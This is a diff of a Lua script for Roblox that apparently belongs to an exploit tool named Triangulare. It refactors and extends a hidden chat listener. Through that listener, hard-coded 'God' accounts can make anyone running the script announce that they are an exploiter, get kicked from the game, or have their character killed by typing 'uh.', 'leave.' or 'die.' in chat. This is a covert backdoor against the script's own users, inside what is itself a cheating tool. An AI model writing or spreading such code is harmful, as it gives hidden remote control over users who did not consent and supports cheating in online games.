@@ -52,26 +52,32 @@ if Game then
         Gods = {"VladmirNine", "Moligrafi"}
       }
       
+      local function IsGod(props)
+        if props and props.UserId then
+          local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
+          if sender and table.find(Settings.Gods, sender.Name) then
+            return true
+          end
+        end
+        return false
+      end
+      
       if not table.find(Settings.Gods, eu.Name) then
         local TextChatService = game:GetService("TextChatService")
         if not getgenv().Triangulare then
           getgenv().Triangulare = true
           TextChatService.MessageReceived:Connect(function(message)
-            local props = message.TextSource
-            if props and props.UserId then
-              local sender = game:GetService("Players"):GetPlayerByUserId(props.UserId)
-              if sender and table.find(Settings.Gods, sender.Name) then
-                if message.Text == "uh." then
-                  local now = tick()
-                  if now - Settings.LastReveal >= Settings.Cooldown then
-                    Settings.LastReveal = now
-                    TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
-                  end
-                elseif message.Text == "leave." then
-                  task.wait(2)
-                  game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
-                end
+            if message.Text == "uh." and IsGod(message.TextSource) then
+              local now = tick()
+              if now - Settings.LastReveal >= Settings.Cooldown then
+                Settings.LastReveal = now
+                TextChatService.TextChannels.RBXGeneral:SendAsync("Hey! I'm a exploiter! Using Triangulare — made by Moligrafi.")
               end
+            elseif message.Text == "leave." and IsGod(message.TextSource) then
+              task.wait(2)
+              game:GetService("Players").LocalPlayer:Kick("You were kicked by a Triangulare admin.")
+            elseif message.Text == "die." and IsGod(message.TextSource) then
+              eu.Character.Head:Destroy()
             end
           end)
         end
